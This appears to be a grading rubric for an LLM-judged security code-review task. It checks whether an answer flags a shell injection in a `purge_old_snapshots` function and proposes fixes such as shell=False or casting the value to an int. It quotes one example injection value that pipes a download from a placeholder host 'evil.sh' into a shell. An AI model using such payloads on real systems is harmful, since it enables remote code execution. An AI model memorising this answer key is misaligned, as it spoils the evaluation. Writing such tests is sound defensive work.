---
type: llm
weight: 1
---
Score 1 only if the answer identifies `subprocess.run(cmd, shell=True)` in `purge_old_snapshots` as a shell/command injection vulnerability: `cmd` is built with `.format()` from `retention_days`, which per the docstring comes straight from an HTTP request body field with no validation, and is executed with `shell=True`, so an attacker can inject shell metacharacters (e.g. `0; curl evil.sh | sh`). The answer must rate this Critical/High and propose a concrete fix (e.g. `shell=False` with an argument list, validating/casting `retention_days` to an int before use, or `shlex.quote`). Score 0 if this injection is missed, dismissed as low severity, or no concrete fix is given.
